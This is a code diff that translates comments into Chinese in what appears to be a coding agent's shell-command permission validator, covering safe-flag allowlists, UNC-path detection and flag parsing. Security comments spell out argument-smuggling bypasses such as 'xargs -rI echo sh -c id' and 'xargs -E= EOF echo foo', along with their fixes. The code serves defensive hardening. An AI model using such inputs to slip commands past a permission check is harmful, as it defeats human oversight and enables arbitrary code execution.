+      '--sort': 'string', // 排序字段
+      '--state': 'string', // 过滤：open|closed
+      '--team-mentions': 'string', // 按 team mention 过滤
+      '--updated': 'string', // 按更新日期过滤
+      '--visibility': 'string', // 过滤：public|private|internal
     },
   },
-  // gh search commits is read-only — searches commits
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh search commits 是只读命令 — 搜索 commit
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh search commits': {
     safeFlags: {
-      '--author': 'string', // Filter by author
-      '--author-date': 'string', // Filter by authored date
-      '--author-email': 'string', // Filter by author email
-      '--author-name': 'string', // Filter by author name
-      '--committer': 'string', // Filter by committer
-      '--committer-date': 'string', // Filter by committed date
-      '--committer-email': 'string', // Filter by committer email
-      '--committer-name': 'string', // Filter by committer name
-      '--hash': 'string', // Filter by commit hash
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--author': 'string', // 按作者过滤
+      '--author-date': 'string', // 按作者日期过滤
+      '--author-email': 'string', // 按作者邮箱过滤
+      '--author-name': 'string', // 按作者姓名过滤
+      '--committer': 'string', // 按提交者过滤
+      '--committer-date': 'string', // 按提交日期过滤
+      '--committer-email': 'string', // 按提交者邮箱过滤
+      '--committer-name': 'string', // 按提交者姓名过滤
+      '--hash': 'string', // 按 commit hash 过滤
+      '--json': 'string', // JSON 字段选择
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--merge': 'none', // Filter merge commits
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--parent': 'string', // Filter by parent hash
-      '--repo': 'string', // Filter by repository
+      '--merge': 'none', // 过滤合并 commit
+      '--order': 'string', // 排序方向：asc|desc
+      '--owner': 'string', // 按 owner 过滤
+      '--parent': 'string', // 按 parent hash 过滤
+      '--repo': 'string', // 按仓库过滤
       '-R': 'string',
-      '--sort': 'string', // Sort: author-date|committer-date
-      '--tree': 'string', // Filter by tree hash
-      '--visibility': 'string', // Filter: public|private|internal
+      '--sort': 'string', // 排序：author-date|committer-date
+      '--tree': 'string', // 按 tree hash 过滤
+      '--visibility': 'string', // 过滤：public|private|internal
     },
   },
-  // gh search code is read-only — searches code
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh search code 是只读命令 — 搜索代码
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh search code': {
     safeFlags: {
-      '--extension': 'string', // Filter by file extension
-      '--filename': 'string', // Filter by filename
-      '--json': 'string', // JSON field selection
-      '--language': 'string', // Filter by language
-      '--limit': 'number', // Max results
+      '--extension': 'string', // 按文件扩展名过滤
+      '--filename': 'string', // 按文件名过滤
+      '--json': 'string', // JSON 字段选择
+      '--language': 'string', // 按语言过滤
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--match': 'string', // Restrict to: file|path
-      '--owner': 'string', // Filter by owner
-      '--repo': 'string', // Filter by repository
+      '--match': 'string', // 限定：file|path
+      '--owner': 'string', // 按 owner 过滤
+      '--repo': 'string', // 按仓库过滤
       '-R': 'string',
-      '--size': 'string', // Filter by size range
+      '--size': 'string', // 按大小范围过滤
     },
   },
 }
 
 // ---------------------------------------------------------------------------
-// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs read-only commands
+// DOCKER_READ_ONLY_COMMANDS — docker inspect/logs 只读命令
 // ---------------------------------------------------------------------------
 
 export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
@@ -1410,101 +1405,101 @@ export const DOCKER_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   }
 
 // ---------------------------------------------------------------------------
-// RIPGREP_READ_ONLY_COMMANDS — rg (ripgrep) read-only search
+// RIPGREP_READ_ONLY_COMMANDS — rg（ripgrep）只读搜索
 // ---------------------------------------------------------------------------
 
 export const RIPGREP_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     rg: {
       safeFlags: {
-        // Pattern flags
-        '-e': 'string', // Pattern to search for
+        // 模式 flag
+        '-e': 'string', // 要搜索的模式
         '--regexp': 'string',
-        '-f': 'string', // Read patterns from file
+        '-f': 'string', // 从文件读取模式
 
-        // Common search options
-        '-i': 'none', // Case insensitive
+        // 常用搜索选项
+        '-i': 'none', // 大小写不敏感
         '--ignore-case': 'none',
-        '-S': 'none', // Smart case
+        '-S': 'none', // 智能大小写
         '--smart-case': 'none',
-        '-F': 'none', // Fixed strings
+        '-F': 'none', // 固定字符串
         '--fixed-strings': 'none',
-        '-w': 'none', // Word regexp
+        '-w': 'none', // 单词正则
         '--word-regexp': 'none',
-        '-v': 'none', // Invert match
+        '-v': 'none', // 反向匹配
         '--invert-match': 'none',
 
-        // Output options
-        '-c': 'none', // Count matches
+        // 输出选项
+        '-c': 'none', // 统计匹配数
         '--count': 'none',
-        '-l': 'none', // Files with matches
+        '-l': 'none', // 只输出含匹配的文件名
         '--files-with-matches': 'none',
         '--files-without-match': 'none',
-        '-n': 'none', // Line number
+        '-n': 'none', // 行号
         '--line-number': 'none',
-        '-o': 'none', // Only matching
+        '-o': 'none', // 只输出匹配部分
         '--only-matching': 'none',
-        '-A': 'number', // After context
+        '-A': 'number', // 匹配行之后的上下文
         '--after-context': 'number',
-        '-B': 'number', // Before context
+        '-B': 'number', // 匹配行之前的上下文
         '--before-context': 'number',
-        '-C': 'number', // Context
+        '-C': 'number', // 前后上下文
         '--context': 'number',
-        '-H': 'none', // With filename
-        '-h': 'none', // No filename
+        '-H': 'none', // 显示文件名
+        '-h': 'none', // 不显示文件名
         '--heading': 'none',
         '--no-heading': 'none',
-        '-q': 'none', // Quiet
+        '-q': 'none', // 静默模式
         '--quiet': 'none',
         '--column': 'none',
 
-        // File filtering
-        '-g': 'string', // Glob
+        // 文件过滤
+        '-g': 'string', // glob
         '--glob': 'string',
-        '-t': 'string', // Type
+        '-t': 'string', // 类型
         '--type': 'string',
-        '-T': 'string', // Type not
+        '-T': 'string', // 排除类型
         '--type-not': 'string',
         '--type-list': 'none',
         '--hidden': 'none',
         '--no-ignore': 'none',
-        '-u': 'none', // Unrestricted
+        '-u': 'none', // 不受限
 
-        // Common options
-        '-m': 'number', // Max count per file
+        // 常用选项
+        '-m': 'number', // 每个文件的最大匹配数
         '--max-count': 'number',
-        '-d': 'number', // Max depth
+        '-d': 'number', // 最大深度
         '--max-depth': 'number',
-        '-a': 'none', // Text (search binary files)
+        '-a': 'none', // 文本模式（搜索二进制文件）
         '--text': 'none',
-        '-z': 'none', // Search zip
-        '-L': 'none', // Follow symlinks
+        '-z': 'none', // 搜索 zip
+        '-L': 'none', // 跟随符号链接
         '--follow': 'none',
 
-        // Display options
+        // 显示选项
         '--color': 'string',
         '--json': 'none',
         '--stats': 'none',
 
-        // Help and version
+        // 帮助与版本
         '--help': 'none',
         '--version': 'none',
         '--debug': 'none',
 
-        // Special argument separator
+        // 特殊参数分隔符
         '--': 'none',
       },
     },
   }
 
 // ---------------------------------------------------------------------------
-// PYRIGHT_READ_ONLY_COMMANDS — pyright static type checker
+// PYRIGHT_READ_ONLY_COMMANDS — pyright 静态类型检查器
 // ---------------------------------------------------------------------------
 
 export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
   {
     pyright: {
-      respectsDoubleDash: false, // pyright treats -- as a file path, not end-of-options
+      respectsDoubleDash: false, // pyright 把 -- 当作文件路径，而不是选项终止符
       safeFlags: {
         '--outputjson': 'none',
         '--project': 'string',
@@ -1524,100 +1519,100 @@ export const PYRIGHT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> =
         _rawCommand: string,
         args: string[],
       ) => {
-        // Check if --watch or -w appears as a standalone token (flag)
+        // 检查 --watch 或 -w 是否作为独立 token（flag）出现
         return args.some(t => t === '--watch' || t === '-w')
       },
     },
   }
 
 // ---------------------------------------------------------------------------
-// EXTERNAL_READONLY_COMMANDS — cross-shell read-only commands
-// Only commands that work identically in bash and PowerShell on Windows.
-// Unix-specific commands (cat, head, wc, etc.) belong in BashTool's READONLY_COMMANDS.
+// EXTERNAL_READONLY_COMMANDS — 跨 shell 只读命令
+// 仅包含在 Windows 下 bash 和 PowerShell 中行为完全一致的命令。
+// Unix 专有命令（cat、head、wc 等）应放在 BashTool 的 READONLY_COMMANDS 中。
 // ---------------------------------------------------------------------------
 
 export const EXTERNAL_READONLY_COMMANDS: readonly string[] = [
-  // Cross-platform external tools that work the same in bash and PowerShell on Windows
+  // 在 Windows 下 bash 和 PowerShell 中行为一致的跨平台外部工具
   'docker ps',
   'docker images',
 ] as const
 
 // ---------------------------------------------------------------------------
-// UNC path detection (shared across Bash and PowerShell)
+// UNC 路径检测（Bash 和 PowerShell 共享）
 // ---------------------------------------------------------------------------
 
 /**
- * Check if a path or command contains a UNC path that could trigger network
- * requests (NTLM/Kerberos credential leakage, WebDAV attacks).
+ * 检查路径或命令是否包含可能触发网络请求的 UNC 路径
+ * （NTLM/Kerberos 凭据泄露、WebDAV 攻击）。
  *
- * This function detects:
- * - Basic UNC paths: \\server\share, \\foo.com\file
- * - WebDAV patterns: \\server@SSL@8443\, \\server@8443@SSL\, \\server\DavWWWRoot\
- * - IP-based UNC: \\192.168.1.1\share, \\[2001:db8::1]\share
- * - Forward-slash variants: //server/share
+ * 本函数检测：
+ * - 基础 UNC 路径：\\server\share、\\foo.com\file
+ * - WebDAV 模式：\\server@SSL@8443\、\\server@8443@SSL\、\\server\DavWWWRoot\
+ * - 基于 IP 的 UNC：\\192.168.1.1\share、\\[2001:db8::1]\share
+ * - 正斜杠变体：//server/share
  *
- * @param pathOrCommand The path or command string to check
- * @returns true if the path/command contains potentially vulnerable UNC paths
+ * @param pathOrCommand 要检查的路径或命令字符串
+ * @returns 如果路径/命令包含潜在易受攻击的 UNC 路径，返回 true
  */
 export function containsVulnerableUncPath(pathOrCommand: string): boolean {
-  // Only check on Windows platform
+  // 仅在 Windows 平台检查
   if (getPlatform() !== 'windows') {
     return false
   }
 
-  // 1. Check for general UNC paths with backslashes
-  // Pattern matches: \\server, \\server\share, \\server/share, \\server@port\share
-  // Uses [^\s\\/]+ for hostname to catch Unicode homoglyphs and other non-ASCII chars
-  // Trailing accepts both \ and / since Windows treats both as path separators
+  // 1. 检查使用反斜杠的常规 UNC 路径
+  // 模式匹配：\\server、\\server\share、\\server/share、\\server@port\share
+  // 使用 [^\s\\/]+ 匹配 hostname，以捕获 Unicode 同形字和其他非 ASCII 字符
+  // 尾部同时接受 \ 和 /，因为 Windows 把两者都视为路径分隔符
   const backslashUncPattern = /\\\\[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
   if (backslashUncPattern.test(pathOrCommand)) {
     return true
   }
 
-  // 2. Check for forward-slash UNC paths
-  // Pattern matches: //server, //server/share, //server\share, //192.168.1.1/share
-  // Uses negative lookbehind (?<!:) to exclude URLs (https://, http://, ftp://)
-  // while catching // preceded by quotes, =, or any other non-colon character.
-  // Trailing accepts both / and \ since Windows treats both as path separators
+  // 2. 检查正斜杠 UNC 路径
+  // 模式匹配：//server、//server/share、//server\share、//192.168.1.1/share
+  // 使用负向 lookbehind (?<!:) 排除 URL（https://、http://、ftp://），
+  // 同时捕获前面是引号、= 或任何其他非冒号字符的 //。
+  // 尾部同时接受 / 和 \，因为 Windows 把两者都视为路径分隔符
   const forwardSlashUncPattern =
-    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() on short command strings
+    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- 仅对短命令字符串调用 .test()
     /(?<!:)\/\/[^\s\\/]+(?:@(?:\d+|ssl))?(?:[\\/]|$|\s)/i
   if (forwardSlashUncPattern.test(pathOrCommand)) {
     return true
   }
 
-  // 3. Check for mixed-separator UNC paths (forward slash + backslashes)
-  // On Windows/Cygwin, /\ is equivalent to // since both are path separators.
-  // In bash, /\\server becomes /\server after escape processing, which is a UNC path.
-  // Requires 2+ backslashes after / because a single backslash just escapes the next char
-  // (e.g., /\a → /a after bash processing, which is NOT a UNC path).
+  // 3. 检查混合分隔符的 UNC 路径（正斜杠 + 反斜杠）
+  // 在 Windows/Cygwin 下，/\ 等价于 //，因为两者都是路径分隔符。
+  // 在 bash 中，/\\server 经过转义处理后变为 /\server，这就是一个 UNC 路径。
+  // 要求 / 之后至少 2 个反斜杠，因为单个反斜杠只会转义下一个字符
+  // （例如 /\a 在 bash 处理后变成 /a，不是 UNC 路径）。
   const mixedSlashUncPattern = /\/\\{2,}[^\s\\/]/
   if (mixedSlashUncPattern.test(pathOrCommand)) {
     return true
   }
 
-  // 4. Check for mixed-separator UNC paths (backslashes + forward slash)
-  // \\/server in bash becomes \/server after escape processing, which is a UNC path
-  // on Windows since both \ and / are path separators.
+  // 4. 检查混合分隔符的 UNC 路径（反斜杠 + 正斜杠）
+  // bash 中的 \\/server 经过转义处理后变为 \/server，在 Windows 上是一个 UNC 路径，
+  // 因为 \ 和 / 都是路径分隔符。
   const reverseMixedSlashUncPattern = /\\{2,}\/[^\s\\/]/
   if (reverseMixedSlashUncPattern.test(pathOrCommand)) {
     return true
   }
 
-  // 5. Check for WebDAV SSL/port patterns
-  // Examples: \\server@SSL@8443\path, \\server@8443@SSL\path
+  // 5. 检查 WebDAV SSL/端口模式
+  // 示例：\\server@SSL@8443\path、\\server@8443@SSL\path
   if (/@SSL@\d+/i.test(pathOrCommand) || /@\d+@SSL/i.test(pathOrCommand)) {
     return true
   }
 
-  // 6. Check for DavWWWRoot marker (Windows WebDAV redirector)
-  // Example: \\server\DavWWWRoot\path
+  // 6. 检查 DavWWWRoot 标记（Windows WebDAV 重定向器）
+  // 示例：\\server\DavWWWRoot\path
   if (/DavWWWRoot/i.test(pathOrCommand)) {
     return true
   }
 
-  // 7. Check for UNC paths with IPv4 addresses (explicit check for defense-in-depth)
-  // Examples: \\192.168.1.1\share, \\10.0.0.1\path
+  // 7. 检查带 IPv4 地址的 UNC 路径（为防御深度做的显式检查）
+  // 示例：\\192.168.1.1\share、\\10.0.0.1\path
   if (
     /^\\\\(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand) ||
     /^\/\/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\\/]/.test(pathOrCommand)
@@ -1625,8 +1620,8 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
     return true
   }
 
-  // 8. Check for UNC paths with bracketed IPv6 addresses (explicit check for defense-in-depth)
-  // Examples: \\[2001:db8::1]\share, \\[::1]\path
+  // 8. 检查带方括号 IPv6 地址的 UNC 路径（为防御深度做的显式检查）
+  // 示例：\\[2001:db8::1]\share、\\[::1]\path
   if (
     /^\\\\(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand) ||
     /^\/\/(\[[\da-fA-F:]+\])[\\/]/.test(pathOrCommand)
@@ -1638,14 +1633,14 @@ export function containsVulnerableUncPath(pathOrCommand: string): boolean {
 }
 
 // ---------------------------------------------------------------------------
-// Flag validation utilities
+// Flag 校验工具
 // ---------------------------------------------------------------------------
 
-// Regex pattern to match valid flag names (letters, digits, underscores, hyphens)
+// 匹配合法 flag 名（字母、数字、下划线、连字符）的正则
 export const FLAG_PATTERN = /^-[a-zA-Z0-9_-]/
 
 /**
- * Validates flag arguments based on their expected type
+ * 根据期望的类型校验 flag 参数
  */
 export function validateFlagArgument(
   value: string,
@@ -1653,11 +1648,11 @@ export function validateFlagArgument(
 ): boolean {
   switch (argType) {
     case 'none':
-      return false // Should not have been called for 'none' type
+      return false // 对 'none' 类型根本不应该调用本函数
     case 'number':
       return /^\d+$/.test(value)
     case 'string':
-      return true // Any string including empty is valid
+      return true // 任何字符串（包括空串）都合法
     case 'char':
       return value.length === 1
     case '{}':
@@ -1670,16 +1665,16 @@ export function validateFlagArgument(
 }
 
 /**
- * Validates the flags/arguments portion of a tokenized command against a config.
- * This is the flag-walking loop extracted from BashTool's isCommandSafeViaFlagParsing.
+ * 根据配置校验已分词命令中 flags/arguments 部分。
+ * 这是从 BashTool 的 isCommandSafeViaFlagParsing 中抽出的 flag 遍历循环。
  *
- * @param tokens - Pre-tokenized args (from bash shell-quote or PowerShell AST)
- * @param startIndex - Where to start validating (after command tokens)
- * @param config - The safe flags config
- * @param options.commandName - For command-specific handling (git numeric shorthand, grep/rg attached numeric)
- * @param options.rawCommand - For additionalCommandIsDangerousCallback
- * @param options.xargsTargetCommands - If provided, enables xargs-style target command detection
- * @returns true if all flags are valid, false otherwise
+ * @param tokens - 已分词的参数（来自 bash shell-quote 或 PowerShell AST）
+ * @param startIndex - 从哪里开始校验（command token 之后）
+ * @param config - safe flags 配置
+ * @param options.commandName - 用于针对具体命令的特殊处理（git 数字简写、grep/rg 带数字参数）
+ * @param options.rawCommand - 用于 additionalCommandIsDangerousCallback
+ * @param options.xargsTargetCommands - 若提供，则启用 xargs 式目标命令检测
+ * @returns 所有 flag 都合法返回 true，否则返回 false
  */
 export function validateFlags(
   tokens: string[],
@@ -1700,7 +1695,7 @@ export function validateFlags(
       continue
     }
 
-    // Special handling for xargs: once we find the target command, stop validating flags
+    // 针对 xargs 的特殊处理：一旦遇到目标命令就停止校验 flag
     if (
       options?.xargsTargetCommands &&
       options.commandName === 'xargs' &&
@@ -1717,38 +1712,36 @@ export function validateFlags(
     }
 
     if (token === '--') {
-      // SECURITY: Only break if the tool respects POSIX `--` (default: true).
-      // Tools like pyright don't respect `--` — they treat it as a file path
-      // and continue processing subsequent tokens as flags. Breaking here
-      // would let `pyright -- --createstub os` auto-approve a file-write flag.
+      // 安全性：仅当工具遵循 POSIX `--`（默认为 true）时才跳出。
+      // pyright 等工具不遵循 `--` — 它会把 `--` 当作文件路径，
+      // 并继续把后续 token 当作 flag 处理。如果在这里直接 break，
+      // `pyright -- --createstub os` 就会被自动批准一个写文件的 flag。
       if (config.respectsDoubleDash !== false) {
         i++
-        break // Everything after -- is arguments
+        break // -- 之后的都是参数
       }
-      // Tool doesn't respect --: treat as positional arg, keep validating
+      // 工具不遵循 --：当作位置参数处理，继续校验后续 token
       i++
       continue
     }
 
     if (token.startsWith('-') && token.length > 1 && FLAG_PATTERN.test(token)) {
-      // Handle --flag=value format
-      // SECURITY: Track whether the token CONTAINS `=` separately from
-      // whether the value is non-empty. `-E=` has `hasEquals=true` but
-      // `inlineValue=''` (falsy). Without `hasEquals`, the falsy check at
-      // line ~1813 would fall through to "consume next token" — but GNU
-      // getopt for short options with mandatory arg sees `-E=` as `-E` with
-      // ATTACHED arg `=` (it doesn't strip `=` for short options). Parser
-      // differential: validator advances 2 tokens, GNU advances 1.
+      // 处理 --flag=value 格式
+      // 安全性：把「token 是否包含 `=`」与「值是否非空」分开追踪。
+      // `-E=` 满足 hasEquals=true，但 inlineValue=''（falsy）。如果没有 hasEquals，
+      // 下方约 1813 行的 falsy 判断就会落入「消费下一个 token」分支 —— 但 GNU
+      // getopt 对必带参数的短选项会把 `-E=` 视为 `-E` + 附带参数 `=`（短选项
+      // 不会剥离 `=`）。解析器差异：校验器前进 2 个 token，GNU 前进 1 个。
       //
-      // Attack: `xargs -E= EOF echo foo` (zero permissions)
-      //   Validator: inlineValue='' falsy → consumes EOF as -E arg → i+=2 →
-      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → AUTO-ALLOWED
-      //   GNU xargs: -E attached arg=`=` → EOF is TARGET COMMAND → CODE EXEC
+      // 攻击：`xargs -E= EOF echo foo`（零权限）
+      //   校验器：inlineValue='' falsy → 把 EOF 当作 -E 的参数 → i+=2 →
+      //     echo ∈ SAFE_TARGET_COMMANDS_FOR_XARGS → break → 自动批准
+      //   GNU xargs：-E 附带参数 `=` → EOF 是目标命令 → 代码执行
       //
-      // Fix: when hasEquals is true, use inlineValue (even if empty) as the
-      // provided arg. validateFlagArgument('', 'EOF') → false → rejected.
-      // This is correct for all arg types: the user explicitly typed `=`,
-      // indicating they provided a value (empty). Don't consume next token.
+      // 修复：当 hasEquals 为 true 时，使用 inlineValue（即使为空）作为已提供的
+      // 参数。validateFlagArgument('', 'EOF') → false → 被拒绝。
+      // 这对所有参数类型都正确：用户显式输入了 `=`，表示他们提供（空的）值。
+      // 不要消费下一个 token。
       const hasEquals = token.includes('=')
       const [flag, ...valueParts] = token.split('=')
       const inlineValue = valueParts.join('=')
@@ -1760,93 +1753,93 @@ export function validateFlags(
       const flagArgType = config.safeFlags[flag]
 
       if (!flagArgType) {
-        // Special case: git commands support -<number> as shorthand for -n <number>
+        // 特例：git 命令支持 -<数字> 作为 -n <数字> 的简写
         if (options?.commandName === 'git' && flag.match(/^-\d+$/)) {
-          // This is equivalent to -n flag which is safe for git log/diff/show
+          // 等价于 -n flag，对 git log/diff/show 是安全的
           i++
           continue
         }
 
-        // Handle flags with directly attached numeric arguments (e.g., -A20, -B10)
-        // Only apply this special handling to grep and rg commands
+        // 处理直接附带数字参数的 flag（例如 -A20、-B10）
+        // 只对 grep 和 rg 命令启用这种特殊处理
         if (
           (options?.commandName === 'grep' || options?.commandName === 'rg') &&
           flag.startsWith('-') &&
           !flag.startsWith('--') &&
           flag.length > 2
         ) {
-          const potentialFlag = flag.substring(0, 2) // e.g., '-A' from '-A20'
-          const potentialValue = flag.substring(2) // e.g., '20' from '-A20'
+          const potentialFlag = flag.substring(0, 2) // 例如从 '-A20' 取 '-A'
+          const potentialValue = flag.substring(2) // 例如从 '-A20' 取 '20'
 
           if (config.safeFlags[potentialFlag] && /^\d+$/.test(potentialValue)) {
-            // This is a flag with attached numeric argument
+            // 这是一个带附带数字参数的 flag
             const flagArgType = config.safeFlags[potentialFlag]
             if (flagArgType === 'number' || flagArgType === 'string') {
-              // Validate the numeric value
+              // 校验数字值
               if (validateFlagArgument(potentialValue, flagArgType)) {
                 i++
                 continue
               } else {
-                return false // Invalid attached value
+                return false // 附带值不合法
               }
             }
           }
         }
 
-        // Handle combined single-letter flags like -nr
-        // SECURITY: We must NOT allow any bundled flag that takes an argument.
-        // GNU getopt bundling semantics: when an arg-taking option appears LAST
-        // in a bundle with no trailing chars, the NEXT argv element is consumed
-        // as its argument. So `xargs -rI echo sh -c id` is parsed by xargs as:
-        //   -r (no-arg) + -I with replace-str=`echo`, target=`sh -c id`
-        // Our naive handler previously only checked EXISTENCE in safeFlags (both
-        // `-r: 'none'` and `-I: '{}'` are truthy), then `i++` consumed ONE token.
-        // This created a parser differential: our validator thought `echo` was
-        // the xargs target (in SAFE_TARGET_COMMANDS_FOR_XARGS → break), but
-        // xargs ran `sh -c id`. ARBITRARY RCE with only Bash(echo:*) or less.
+        // 处理类似 -nr 的组合单字母 flag
+        // 安全性：我们绝不能允许任何带参数的 flag 进入 bundle。
+        // GNU getopt bundling 语义：当一个带参数选项作为 bundle 的最后一个、
+        // 且后面没有其他字符时，下一个 argv 元素会被当作它的参数。
+        // 因此 `xargs -rI echo sh -c id` 被 xargs 解析为：
+        //   -r（无参）+ -I（replace-str=`echo`），target=`sh -c id`
+        // 我们此前朴素的处理器只检查 safeFlags 中的存在性（`-r: 'none'` 和
+        // `-I: '{}'` 都是真值），随后 `i++` 只消费了一个 token。
+        // 这就产生了 parser differential：校验器以为 `echo` 是 xargs 的目标
+        // （在 SAFE_TARGET_COMMANDS_FOR_XARGS 中 → break），而 xargs 实际
+        // 执行的是 `sh -c id`。只要有 Bash(echo:*) 权限就能任意 RCE。
         //
-        // Fix: require ALL bundled flags to have arg type 'none'. If any bundled
-        // flag requires an argument (non-'none' type), reject the whole bundle.
-        // This is conservative — it blocks `-rI` (xargs) entirely, but that's
-        // the safe direction. Users who need `-I` can use it unbundled: `-r -I {}`.
+        // 修复：要求所有 bundled flag 都是 'none' 类型。如果 bundle 中任何
+        // 一个 flag 需要参数（非 'none' 类型），整个 bundle 都拒绝。
+        // 这比较保守 —— 它会完全阻止 `-rI`（xargs），但这是安全的方向。
+        // 需要 `-I` 的用户可以不用 bundle：`-r -I {}`。
         if (flag.startsWith('-') && !flag.startsWith('--') && flag.length > 2) {
           for (let j = 1; j < flag.length; j++) {
             const singleFlag = '-' + flag[j]
             const flagType = config.safeFlags[singleFlag]
             if (!flagType) {
-              return false // One of the combined flags is not safe
+              return false // 组合中的某个 flag 不安全
             }
-            // SECURITY: Bundled flags must be no-arg type. An arg-taking flag
-            // in a bundle consumes the NEXT token in GNU getopt, which our
-            // handler doesn't model. Reject to avoid parser differential.
+            // 安全性：bundled flag 必须是无参类型。带参数的 flag 在 bundle 中
+            // 会按 GNU getopt 规则消费下一个 token，而我们的处理器并未建模这种情况。
+            // 拒绝以避免 parser differential。
             if (flagType !== 'none') {
-              return false // Arg-taking flag in a bundle — cannot safely validate
+              return false // bundle 中存在带参数的 flag —— 无法安全校验
             }
           }
           i++
           continue
         } else {
-          return false // Unknown flag
+          return false // 未知 flag
         }
       }
 
-      // Validate flag arguments
+      // 校验 flag 参数
       if (flagArgType === 'none') {
-        // SECURITY: hasEquals covers `-FLAG=` (empty inline). Without it,
-        // `-FLAG=` with 'none' type would pass (inlineValue='' is falsy).
+        // 安全性：hasEquals 涵盖 `-FLAG=`（inline 为空）的情况。如果没有它，
+        // `-FLAG=` 搭配 'none' 类型就会通过（因为 inlineValue='' 是 falsy）。
         if (hasEquals) {
-          return false // Flag should not have a value
+          return false // flag 不应该带值
         }
         i++
       } else {
         let argValue: string
-        // SECURITY: Use hasEquals (not inlineValue truthiness). `-E=` must
-        // NOT consume next token — the user explicitly provided empty value.
+        // 安全性：用 hasEquals（而不是 inlineValue 的真值判断）。`-E=` 绝不能
+        // 消费下一个 token —— 用户已经显式提供了空值。
         if (hasEquals) {
           argValue = inlineValue
           i++
         } else {
-          // Check if next token is the argument
+          // 检查下一个 token 是否是参数
           if (
             i + 1 >= tokens.length ||
             (tokens[i + 1] &&
@@ -1854,37 +1847,37 @@ export function validateFlags(
               tokens[i + 1]!.length > 1 &&
               FLAG_PATTERN.test(tokens[i + 1]!))
           ) {
-            return false // Missing required argument
+            return false // 缺少必需的参数
           }
           argValue = tokens[i + 1] || ''
           i += 2
         }
 
-        // Defense-in-depth: For string arguments, reject values that start with '-'
-        // This prevents type confusion attacks where a flag marked as 'string'
-        // but actually takes no arguments could be used to inject dangerous flags
-        // Exception: git's --sort flag can have values starting with '-' for reverse sorting
+        // 防御深度：对 string 类型的参数，拒绝以 '-' 开头的值。
+        // 这样可以防止类型混淆攻击 —— 某个被标记为 'string' 但实际不接参数的
+        // flag 被利用来注入危险 flag。
+        // 例外：git 的 --sort flag 的值可以以 '-' 开头，用于反向排序
         if (flagArgType === 'string' && argValue.startsWith('-')) {
-          // Special case: git's --sort flag allows - prefix for reverse sorting
+          // 特例：git 的 --sort flag 允许以 '-' 前缀表示反向排序
           if (
             flag === '--sort' &&
             options?.commandName === 'git' &&
             argValue.match(/^-[a-zA-Z]/)
           ) {
-            // This looks like a reverse sort (e.g., -refname, -version:refname)
-            // Allow it if the rest looks like a valid sort key
+            // 这看起来像反向排序（例如 -refname、-version:refname）
+            // 如果剩余部分像合法的 sort key 就放行
           } else {
             return false
           }
         }
 
-        // Validate argument based on type
+        // 根据类型校验参数
         if (!validateFlagArgument(argValue, flagArgType)) {
           return false
         }
       }
     } else {
-      // Non-flag argument (like revision specs, file paths, etc.) - this is allowed
+      // 非 flag 参数（例如 revision spec、文件路径等） - 允许
       i++
     }
   }
